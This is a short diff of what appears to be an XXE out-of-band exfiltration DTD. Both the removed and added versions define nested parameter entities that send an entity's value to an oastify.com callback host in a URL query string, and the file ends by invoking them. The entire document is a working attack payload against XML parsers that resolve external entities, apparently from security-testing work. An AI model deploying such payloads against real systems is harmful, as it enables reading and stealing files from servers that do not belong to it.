@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "tsetset">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://sc80n6ch61v7tvqvvm210ra3lurtfw3l.oastify.com/?x=%file;'>">
+<!ENTITY % variable "first_Let_test">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://1ce9nfcq6avgt4q4vv2a00acl3r2f73w.oastify.com/?x=%variable;'>">
 %eval;
 %exfil;
